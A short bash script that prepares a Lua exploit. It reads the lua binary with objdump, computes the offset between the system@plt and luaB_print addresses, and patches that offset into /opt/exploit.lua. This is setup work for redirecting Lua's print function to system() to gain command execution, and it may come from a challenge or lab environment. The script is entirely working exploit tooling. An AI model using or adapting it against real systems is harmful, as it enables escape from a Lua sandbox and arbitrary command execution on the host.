#!/bin/bash
system_address=$(objdump -d $(which lua) |grep -Po "[0-9a-f]+ (?=\<system@plt\>\:)")
print_address=$(objdump -d $(which lua) |grep -Po "[0-9a-f]+ (?=\<luaB_print\>\:)")
address_diff=$((0x${system_address} - 0x${print_address}))
sed -i "s|ADDR_DIFF|${address_diff}|" /opt/exploit.lua

